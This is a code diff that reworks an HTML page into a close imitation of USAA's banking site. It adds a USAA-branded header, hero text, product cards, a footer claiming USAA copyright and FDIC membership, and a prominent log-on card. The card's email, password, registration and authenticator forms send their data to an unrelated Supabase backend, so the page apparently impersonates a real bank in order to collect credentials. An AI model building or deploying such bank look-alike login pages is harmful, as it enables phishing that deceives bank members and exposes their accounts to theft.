@@ -14,54 +14,175 @@
     }
 
     body {
+      background-color: #f8fafc;
+      color: #0b1f3a;
+    }
+
+    /* ===== Navigation ===== */
+    header {
       background-color: #002649;
       color: #ffffff;
+      padding: 0 48px;
       display: flex;
-      justify-content: center;
+      justify-content: space-between;
       align-items: center;
-      min-height: 100vh;
-      padding: 20px;
+      height: 72px;
+      position: sticky;
+      top: 0;
+      z-index: 100;
     }
 
-    .auth-card {
-      background-color: #ffffff;
-      color: #333333;
-      width: 100%;
-      max-width: 420px;
-      border-radius: 16px;
-      padding: 30px 25px;
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+    .nav-left {
+      display: flex;
+      align-items: center;
+      gap: 32px;
     }
 
-    .brand-header {
-      text-align: center;
-      margin-bottom: 25px;
+    .brand-logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-weight: 800;
+      font-size: 22px;
+      letter-spacing: 1px;
+      color: #ffffff;
+      text-decoration: none;
     }
 
-    .brand-header i {
-      font-size: 40px;
+    .brand-logo i {
+      font-size: 26px;
+    }
+
+    .nav-links {
+      display: flex;
+      gap: 24px;
+      list-style: none;
+    }
+
+    .nav-links a {
+      color: #ffffff;
+      text-decoration: none;
+      font-size: 15px;
+      font-weight: 500;
+    }
+
+    .nav-right {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .btn-outline {
+      border: 1px solid #ffffff;
+      background: transparent;
+      color: #ffffff;
+      padding: 8px 20px;
+      border-radius: 4px;
+      font-weight: 600;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .btn-gold {
+      background-color: #f3b13f;
       color: #002649;
-    }
-
-    .brand-header h1 {
-      font-size: 24px;
+      padding: 9px 20px;
+      border-radius: 4px;
       font-weight: 700;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    /* ===== Hero Section ===== */
+    .hero-section {
+      background: linear-gradient(rgba(0, 38, 73, 0.55), rgba(0, 38, 73, 0.55)),
+                  url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1600&q=80') center/cover no-repeat;
+      min-height: 520px;
+      padding: 48px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 40px;
+    }
+
+    .hero-content {
+      max-width: 580px;
+      color: #ffffff;
+    }
+
+    .hero-tag {
+      font-size: 13px;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      font-weight: 700;
+      margin-bottom: 12px;
+      opacity: 0.9;
+    }
+
+    .hero-title {
+      font-size: 42px;
+      font-weight: 800;
+      line-height: 1.15;
+      margin-bottom: 16px;
+    }
+
+    .hero-subtitle {
+      font-size: 16px;
+      line-height: 1.5;
+      margin-bottom: 28px;
+      opacity: 0.95;
+    }
+
+    .btn-hero {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background-color: #f3b13f;
       color: #002649;
-      margin-top: 8px;
+      padding: 14px 28px;
+      border-radius: 24px;
+      font-weight: 700;
+      text-decoration: none;
+    }
+
+    /* ===== Login Card ===== */
+    .login-card {
+      background: #ffffff;
+      border-radius: 12px;
+      padding: 28px 24px;
+      width: 380px;
+      box-shadow: 0 12px 30px rgba(0,0,0,0.18);
+      flex-shrink: 0;
+    }
+
+    .login-header {
+      font-size: 18px;
+      font-weight: 700;
+      margin-bottom: 6px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #002649;
+    }
+
+    .login-sub {
+      font-size: 13px;
+      color: #64748b;
+      margin-bottom: 18px;
     }
 
     .tabs {
       display: flex;
       border-bottom: 2px solid #e2e8f0;
-      margin-bottom: 20px;
+      margin-bottom: 18px;
     }
 
     .tab-btn {
       flex: 1;
-      padding: 12px;
+      padding: 10px;
       background: none;
       border: none;
-      font-size: 16px;
+      font-size: 15px;
       font-weight: 600;
       color: #64748b;
       cursor: pointer;
@@ -74,7 +195,7 @@
     }
 
     .form-group {
-      margin-bottom: 16px;
+      margin-bottom: 14px;
     }
 
     .form-group label {
@@ -82,17 +203,16 @@
       font-size: 13px;
       font-weight: 600;
       color: #475569;
-      margin-bottom: 6px;
+      margin-bottom: 5px;
     }
 
     .form-group input {
       width: 100%;
       padding: 12px;
       border: 1px solid #cbd5e1;
-      border-radius: 8px;
+      border-radius: 6px;
       font-size: 15px;
       outline: none;
-      color: #333333;
     }
 
     .form-group input:focus {
@@ -101,15 +221,15 @@
 
     .btn-submit {
       width: 100%;
-      padding: 14px;
+      padding: 13px;
       background-color: #002649;
       color: #ffffff;
       border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      font-weight: 600;
+      border-radius: 6px;
+      font-size: 15px;
+      font-weight: 700;
       cursor: pointer;
-      margin-top: 10px;
+      margin-top: 6px;
     }
 
     .btn-submit:hover {
@@ -123,11 +243,11 @@
 
     .btn-secondary {
       width: 100%;
-      padding: 12px;
+      padding: 11px;
       background: white;
       color: #002649;
       border: 1px solid #cbd5e1;
-      border-radius: 8px;
+      border-radius: 6px;
       font-size: 14px;
       font-weight: 600;
       cursor: pointer;
@@ -135,10 +255,10 @@
     }
 
     .alert {
-      padding: 12px;
+      padding: 11px;
       border-radius: 6px;
-      font-size: 14px;
-      margin-bottom: 15px;
+      font-size: 13px;
+      margin-bottom: 14px;
       display: none;
       word-break: break-word;
     }
@@ -159,9 +279,9 @@
 
     .otp-info {
       text-align: center;
-      font-size: 14px;
+      font-size: 13px;
       color: #475569;
-      margin-bottom: 18px;
+      margin-bottom: 14px;
       line-height: 1.45;
     }
 
@@ -171,95 +291,476 @@
 
     .qr-container {
       text-align: center;
-      margin: 15px 0;
+      margin: 12px 0;
     }
 
     .qr-container img {
-      max-width: 200px;
+      max-width: 180px;
       border: 1px solid #e2e8f0;
       border-radius: 8px;
+    }
+
+    /* ===== Main Content ===== */
+    main {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 48px 24px;
+    }
+
+    .section-title {
+      font-size: 24px;
+      font-weight: 700;
+      margin-bottom: 24px;
+      color: #002649;
+    }
+
+    .cards-grid {
+      display: grid;
+      grid-template-columns: repeat(6, 1fr);
+      gap: 16px;
+      margin-bottom: 48px;
+    }
+
+    .card {
+      background: #ffffff;
+      border-radius: 10px;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      min-height: 210px;
+      border: 1px solid #e2e8f0;
+      text-decoration: none;
+      color: inherit;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+
+    .card:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 8px 20px rgba(0,0,0,0.06);
+    }
+
+    .card-icon {
+      font-size: 26px;
+      margin-bottom: 12px;
+      color: #002649;
+    }
+
+    .card-title {
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: 6px;
+      color: #002649;
+    }
+
+    .card-desc {
+      font-size: 13px;
+      color: #64748b;
+      line-height: 1.4;
+    }
+
+    .card-arrow {
+      align-self: flex-end;
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background: #002649;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      margin-top: 12px;
+    }
+
+    /* Promo Banner */
+    .promo-banner {
+      background-color: #002649;
+      color: #ffffff;
+      border-radius: 14px;
+      padding: 40px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 48px;
+      gap: 30px;
+    }
+
+    .promo-text h3 {
+      font-size: 28px;
+      font-weight: 800;
+      margin-bottom: 12px;
+    }
+
+    .promo-text p {
+      font-size: 14px;
+      opacity: 0.85;
+      margin-bottom: 24px;
+    }
+
+    .btn-white {
+      background-color: #ffffff;
+      color: #002649;
+      padding: 10px 20px;
+      border-radius: 20px;
+      text-decoration: none;
+      font-weight: 700;
+      font-size: 14px;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .promo-features {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 18px;
+    }
+
+    .feature-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 14px;
+    }
+
+    /* Why Section */
+    .why-section {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: #ffffff;
+      border-radius: 12px;
+      padding: 36px;
+      border: 1px solid #e2e8f0;
+      gap: 30px;
+    }
+
+    .why-left {
+      max-width: 300px;
+    }
+
+    .why-stats {
+      display: flex;
+      gap: 48px;
+    }
+
+    .stat-item {
+      text-align: center;
+    }
+
+    .stat-title {
+      font-weight: 700;
+      font-size: 16px;
+      margin-top: 8px;
+      color: #002649;
+    }
+
+    .stat-desc {
+      font-size: 13px;
+      color: #64748b;
+    }
+
+    /* Footer */
+    footer {
+      background-color: #001a33;
+      color: #94a3b8;
+      padding: 32px 48px;
+      font-size: 13px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .footer-links {
+      display: flex;
+      gap: 20px;
+      list-style: none;
+    }
+
+    .footer-links a {
+      color: #94a3b8;
+      text-decoration: none;
+    }
+
+    /* ===== Responsive ===== */
+    @media (max-width: 1100px) {
+      .cards-grid {
+        grid-template-columns: repeat(3, 1fr);
+      }
+    }
+
+    @media (max-width: 900px) {
+      header {
+        padding: 0 20px;
+      }
+      .nav-links {
+        display: none;
+      }
+      .hero-section {
+        flex-direction: column;
+        padding: 32px 20px;
+        text-align: center;
+      }
+      .hero-content {
+        max-width: 100%;
+      }
+      .hero-title {
+        font-size: 32px;
+      }
+      .login-card {
+        width: 100%;
+        max-width: 420px;
+      }
+      .cards-grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
+      .promo-banner {
+        flex-direction: column;
+        text-align: center;
+      }
+      .why-section {
+        flex-direction: column;
+        text-align: center;
+      }
+      .why-stats {
+        gap: 28px;
+      }
+      footer {
+        flex-direction: column;
+        gap: 16px;
+        text-align: center;
+        padding: 28px 20px;
+      }
+    }
+
+    @media (max-width: 520px) {
+      .cards-grid {
+        grid-template-columns: 1fr;
+      }
+      .promo-features {
+        grid-template-columns: 1fr;
+      }
+      .why-stats {
+        flex-direction: column;
+        gap: 20px;
+      }
     }
   </style>
 </head>
 <body>
 
-  <div class="auth-card">
-    <div class="brand-header">
-      <i class="fa-solid fa-building-columns"></i>
-      <h1>USAA</h1>
+  <!-- Navigation -->
+  <header>
+    <div class="nav-left">
+      <a href="#" class="brand-logo">
+        <i class="fa-solid fa-shield-halved"></i>
+        <span>USAA</span>
+      </a>
+      <ul class="nav-links">
+        <li><a href="#">Products</a></li>
+        <li><a href="#">Advice & Planning</a></li>
+        <li><a href="#">Member Resources</a></li>
+        <li><a href="#">Our Mission</a></li>
+      </ul>
+    </div>
+    <div class="nav-right">
+      <a href="#loginCard" class="btn-outline">Log On</a>
+      <a href="#loginCard" class="btn-gold" onclick="document.getElementById('register-tab').click()">Join Us</a>
+    </div>
+  </header>
+
+  <!-- Hero Section -->
+  <section class="hero-section">
+    <div class="hero-content">
+      <div class="hero-tag">SERVING THOSE WHO SERVE</div>
+      <h1 class="hero-title">More than a bank.<br>We're your lifelong financial partner.</h1>
+      <p class="hero-subtitle">Providing simple, secure, and personalized financial solutions for our community and their families.</p>
+      <a href="#loginCard" class="btn-hero">Explore Our Products →</a>
     </div>
 
-    <div class="tabs" id="tabs">
-      <button id="login-tab" class="tab-btn active">Log In</button>
-      <button id="register-tab" class="tab-btn">Register</button>
+    <!-- Login Card -->
+    <div class="login-card" id="loginCard">
+      <div class="login-header">
+        <i class="fa-solid fa-lock"></i> Log On to Your Account
+      </div>
+      <div class="login-sub">Access your accounts, manage your money and more.</div>
+
+      <div class="tabs" id="tabs">
+        <button id="login-tab" class="tab-btn active">Log In</button>
+        <button id="register-tab" class="tab-btn">Register</button>
+      </div>
+
+      <div id="alert-box" class="alert"></div>
+
+      <!-- LOGIN FORM -->
+      <form id="login-form">
+        <div class="form-group">
+          <label>Email Address</label>
+          <input type="email" id="login-email" placeholder="Enter your email" required>
+        </div>
+        <div class="form-group">
+          <label>Password</label>
+          <input type="password" id="login-password" placeholder="••••••••" required>
+        </div>
+        <button type="submit" class="btn-submit" id="login-btn">Log In</button>
+      </form>
+
+      <!-- MFA FORM -->
+      <form id="mfa-form">
+        <div class="otp-info">
+          Open <strong>Google Authenticator</strong> and enter the 6-digit code
+        </div>
+        <div class="form-group">
+          <label>Authenticator Code</label>
+          <input type="text" id="mfa-code" placeholder="000000" maxlength="6" inputmode="numeric" required
+                 style="text-align:center; font-size:22px; letter-spacing:8px;">
+        </div>
+        <button type="submit" class="btn-submit" id="mfa-btn">Verify & Login</button>
+        <button type="button" class="btn-secondary" id="back-to-login">← Back to Login</button>
+      </form>
+
+      <!-- ENROLL FORM -->
+      <form id="enroll-form">
+        <div class="otp-info">
+          Scan this QR code with <strong>Google Authenticator</strong>
+        </div>
+        <div class="qr-container" id="qr-container"></div>
+        <div class="form-group">
+          <label>Enter the 6-digit code from the app</label>
+          <input type="text" id="enroll-code" placeholder="000000" maxlength="6" inputmode="numeric" required
+                 style="text-align:center; font-size:22px; letter-spacing:8px;">
+        </div>
+        <button type="submit" class="btn-submit" id="enroll-btn">Activate Authenticator</button>
+      </form>
+
+      <!-- REGISTER FORM -->
+      <form id="register-form" style="display:none;">
+        <div class="form-group">
+          <label>Full Name</label>
+          <input type="text" id="reg-name" placeholder="Full name" required>
+        </div>
+        <div class="form-group">
+          <label>Email Address</label>
+          <input type="email" id="reg-email" placeholder="Email address" required>
+        </div>
+        <div class="form-group">
+          <label>Phone Number</label>
+          <input type="tel" id="reg-phone" placeholder="+1 (555) 000-0000" required>
+        </div>
+        <div class="form-group">
+          <label>Password</label>
+          <input type="password" id="reg-password" placeholder="Create password" required>
+        </div>
+        <button type="submit" class="btn-submit" id="reg-btn">Create Account</button>
+      </form>
+    </div>
+  </section>
+
+  <!-- Main Content -->
+  <main>
+    <h2 class="section-title">How We Can Help You</h2>
+
+    <div class="cards-grid">
+      <a href="#" class="card">
+        <div class="card-icon"><i class="fa-solid fa-building-columns"></i></div>
+        <div>
+          <div class="card-title">Banking</div>
+          <div class="card-desc">Checking, savings, CDs, and more.</div>
+        </div>
+        <div class="card-arrow">→</div>
+      </a>
+      <a href="#" class="card">
+        <div class="card-icon"><i class="fa-solid fa-shield-halved"></i></div>
+        <div>
+          <div class="card-title">Insurance</div>
+          <div class="card-desc">Auto, home, renters, life and more.</div>
+        </div>
+        <div class="card-arrow">→</div>
+      </a>
+      <a href="#" class="card">
+        <div class="card-icon"><i class="fa-solid fa-chart-line"></i></div>
+        <div>
+          <div class="card-title">Investing</div>
+          <div class="card-desc">Build your future with confidence.</div>
+        </div>
+        <div class="card-arrow">→</div>
+      </a>
+      <a href="#" class="card">
+        <div class="card-icon"><i class="fa-solid fa-credit-card"></i></div>
+        <div>
+          <div class="card-title">Credit Cards</div>
+          <div class="card-desc">Rewards, low rates, and more.</div>
+        </div>
+        <div class="card-arrow">→</div>
+      </a>
+      <a href="#" class="card">
+        <div class="card-icon"><i class="fa-solid fa-house"></i></div>
+        <div>
+          <div class="card-title">Loans</div>
+          <div class="card-desc">Auto, home, personal, and more.</div>
+        </div>
+        <div class="card-arrow">→</div>
+      </a>
+      <a href="#" class="card">
+        <div class="card-icon"><i class="fa-solid fa-bullseye"></i></div>
+        <div>
+          <div class="card-title">Financial Planning</div>
+          <div class="card-desc">Guidance for every stage of life.</div>
+        </div>
+        <div class="card-arrow">→</div>
+      </a>
     </div>
 
-    <div id="alert-box" class="alert"></div>
+    <div class="promo-banner">
+      <div class="promo-text">
+        <h3>Your finances.<br>On your terms.</h3>
+        <p>Check balances, make payments, deposit checks and more — anytime, anywhere.</p>
+        <a href="#loginCard" class="btn-white">Learn More →</a>
+      </div>
+      <div class="promo-features">
+        <div class="feature-item">🔒 Secure & Easy Access</div>
+        <div class="feature-item">📱 Mobile Check Deposit</div>
+        <div class="feature-item">📄 Bill Pay</div>
+        <div class="feature-item">🔔 Account Alerts</div>
+      </div>
+    </div>
 
-    <!-- LOGIN FORM -->
-    <form id="login-form">
-      <div class="form-group">
-        <label>Email Address</label>
-        <input type="email" id="login-email" placeholder="Enter your email" required />
+    <div class="why-section">
+      <div class="why-left">
+        <h3 style="font-size: 20px; font-weight:700; margin-bottom: 8px; color:#002649;">Why Choose USAA?</h3>
+        <p style="font-size: 14px; color: #64748b;">We're proud to serve our members with products and services they can count on.</p>
       </div>
-      <div class="form-group">
-        <label>Password</label>
-        <input type="password" id="login-password" placeholder="••••••••" required />
+      <div class="why-stats">
+        <div class="stat-item">
+          <div style="font-size: 28px;">🛡️</div>
+          <div class="stat-title">Trusted</div>
+          <div class="stat-desc">for 100+ years</div>
+        </div>
+        <div class="stat-item">
+          <div style="font-size: 28px;">👥</div>
+          <div class="stat-title">13+ million</div>
+          <div class="stat-desc">members</div>
+        </div>
+        <div class="stat-item">
+          <div style="font-size: 28px;">⭐</div>
+          <div class="stat-title">Highly rated</div>
+          <div class="stat-desc">customer service</div>
+        </div>
       </div>
-      <button type="submit" class="btn-submit" id="login-btn">Log In</button>
-    </form>
+    </div>
+  </main>
 
-    <!-- MFA (Google Authenticator) FORM -->
-    <form id="mfa-form">
-      <div class="otp-info">
-        Open <strong>Google Authenticator</strong> and enter the 6-digit code
-      </div>
-      <div class="form-group">
-        <label>Authenticator Code</label>
-        <input type="text" id="mfa-code" placeholder="000000" maxlength="6" inputmode="numeric" required 
-               style="text-align:center; font-size:22px; letter-spacing:8px;" />
-      </div>
-      <button type="submit" class="btn-submit" id="mfa-btn">Verify & Login</button>
-      <button type="button" class="btn-secondary" id="back-to-login">← Back to Login</button>
-    </form>
-
-    <!-- ENROLL FORM (First time setup) -->
-    <form id="enroll-form">
-      <div class="otp-info">
-        Scan this QR code with <strong>Google Authenticator</strong>
-      </div>
-      <div class="qr-container" id="qr-container">
-        <!-- QR will appear here -->
-      </div>
-      <div class="form-group">
-        <label>Enter the 6-digit code from the app</label>
-        <input type="text" id="enroll-code" placeholder="000000" maxlength="6" inputmode="numeric" required 
-               style="text-align:center; font-size:22px; letter-spacing:8px;" />
-      </div>
-      <button type="submit" class="btn-submit" id="enroll-btn">Activate Authenticator</button>
-    </form>
-
-    <!-- REGISTRATION FORM -->
-    <form id="register-form" style="display: none;">
-      <div class="form-group">
-        <label>Full Name</label>
-        <input type="text" id="reg-name" placeholder="Sarah Jenkins" required />
-      </div>
-      <div class="form-group">
-        <label>Email Address</label>
-        <input type="email" id="reg-email" placeholder="sarah@example.com" required />
-      </div>
-      <div class="form-group">
-        <label>Phone Number</label>
-        <input type="tel" id="reg-phone" placeholder="+1 (555) 000-0000" required />
-      </div>
-      <div class="form-group">
-        <label>Password</label>
-        <input type="password" id="reg-password" placeholder="Create password" required />
-      </div>
-      <button type="submit" class="btn-submit" id="reg-btn">Create Account</button>
-    </form>
-  </div>
+  <footer>
+    <ul class="footer-links">
+      <li><a href="#">About Us</a></li>
+      <li><a href="#">Careers</a></li>
+      <li><a href="#">Accessibility</a></li>
+      <li><a href="#">Privacy & Security</a></li>
+      <li><a href="#">Terms & Conditions</a></li>
+    </ul>
+    <div>© 2026 USAA. All rights reserved. Member FDIC.</div>
+  </footer>
 
   <script type="module">
     import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm';
@@ -313,7 +814,7 @@
     registerTab.addEventListener('click', () => switchTab('register'));
     document.getElementById('back-to-login').addEventListener('click', () => switchTab('login'));
 
-    // ===================== LOGIN =====================
+    // LOGIN
     loginForm.addEventListener('submit', async (e) => {
       e.preventDefault();
       const loginBtn = document.getElementById('login-btn');
@@ -325,40 +826,29 @@
       const password = document.getElementById('login-password').value;
 
       try {
-        const { data, error } = await supabase.auth.signInWithPassword({
-          email,
-          password
-        });
-
+        const { data, error } = await supabase.auth.signInWithPassword({ email, password });
         if (error) throw error;
 
-        // Check if user has MFA enabled
         const { data: factors, error: factorsError } = await supabase.auth.mfa.listFactors();
         if (factorsError) throw factorsError;
 
         const totpFactor = factors?.totp?.[0];
 
         if (totpFactor && totpFactor.status === 'verified') {
-          // MFA is enabled → challenge the user
           currentFactorId = totpFactor.id;
-
           const { data: challenge, error: challengeError } = await supabase.auth.mfa.challenge({
             factorId: currentFactorId
           });
-
           if (challengeError) throw challengeError;
           currentChallengeId = challenge.id;
 
-          // Show MFA form
           loginForm.style.display = 'none';
           tabs.style.display = 'none';
           mfaForm.style.display = 'block';
           showAlert('Enter the code from Google Authenticator', 'success');
         } else {
-          // No MFA yet → force enrollment
           await startEnrollment();
         }
-
       } catch (err) {
         console.error(err);
         showAlert(err.message || "Invalid email or password", 'error');
@@ -368,7 +858,7 @@
       }
     });
 
-    // ===================== MFA VERIFY =====================
+    // MFA VERIFY
     mfaForm.addEventListener('submit', async (e) => {
       e.preventDefault();
       const mfaBtn = document.getElementById('mfa-btn');
@@ -379,19 +869,15 @@
       const code = document.getElementById('mfa-code').value.trim();
 
       try {
-        const { data, error } = await supabase.auth.mfa.verify({
+        const { error } = await supabase.auth.mfa.verify({
           factorId: currentFactorId,
           challengeId: currentChallengeId,
           code: code
         });
-
         if (error) throw error;
 
         showAlert('Login successful! Redirecting...', 'success');
-        setTimeout(() => {
-          window.location.href = 'dashboard.html';
-        }, 800);
-
+        setTimeout(() => window.location.href = 'dashboard.html', 800);
       } catch (err) {
         console.error(err);
         showAlert(err.message || "Invalid authenticator code", 'error');
@@ -401,24 +887,22 @@
       }
     });
 
-    // ===================== ENROLLMENT (First time) =====================
+    // ENROLLMENT
     async function startEnrollment() {
       try {
         const { data, error } = await supabase.auth.mfa.enroll({
           factorType: 'totp',
           friendlyName: 'USAA Authenticator'
         });
-
         if (error) throw error;
 
         currentFactorId = data.id;
 
-        // Show QR code
         document.getElementById('qr-container').innerHTML = `
           <img src="${data.totp.qr_code}" alt="QR Code">
           <p style="font-size:12px;margin-top:8px;color:#64748b;">
             Or enter this code manually:<br>
-            <strong>${data.totp.secret}</strong>
+            <strong style="letter-spacing:1px;">${data.totp.secret}</strong>
           </p>
         `;
 
@@ -426,7 +910,6 @@
         tabs.style.display = 'none';
         enrollForm.style.display = 'block';
         showAlert('Scan the QR code with Google Authenticator', 'success');
-
       } catch (err) {
         console.error(err);
         showAlert(err.message || "Could not start authenticator setup", 'error');
@@ -443,26 +926,20 @@
       const code = document.getElementById('enroll-code').value.trim();
 
       try {
-        // First create a challenge
         const { data: challenge, error: challengeError } = await supabase.auth.mfa.challenge({
           factorId: currentFactorId
         });
         if (challengeError) throw challengeError;
 
-        // Then verify
-        const { data, error } = await supabase.auth.mfa.verify({
+        const { error } = await supabase.auth.mfa.verify({
           factorId: currentFactorId,
           challengeId: challenge.id,
           code: code
         });
-
         if (error) throw error;
 
-        showAlert('Google Authenticator activated successfully! Redirecting...', 'success');
-        setTimeout(() => {
-          window.location.href = 'dashboard.html';
-        }, 1200);
-
+        showAlert('Google Authenticator activated! Redirecting...', 'success');
+        setTimeout(() => window.location.href = 'dashboard.html', 1200);
       } catch (err) {
         console.error(err);
         showAlert(err.message || "Invalid code. Please try again.", 'error');
@@ -472,7 +949,7 @@
       }
     });
 
-    // ===================== REGISTRATION =====================
+    // REGISTRATION
     registerForm.addEventListener('submit', async (e) => {
       e.preventDefault();
       const regBtn = document.getElementById('reg-btn');
@@ -491,30 +968,24 @@
           email,
           password,
           options: {
-            data: {
-              full_name: name,
-              phone_number: phone,
-              username: username
-            }
+            data: { full_name: name, phone_number: phone, username }
           }
         });
-
         if (authError) throw authError;
 
         if (authData?.user) {
           await supabase.from('profiles').upsert({
             id: authData.user.id,
             full_name: name,
-            username: username,
+            username,
             phone_number: phone,
-            email: email
+            email
           });
         }
 
         showAlert('Account created! Please log in and set up Google Authenticator.', 'success');
         registerForm.reset();
         setTimeout(() => switchTab('login'), 1800);
-
       } catch (err) {
         console.error(err);
         showAlert(err.message || "Could not register", 'error');
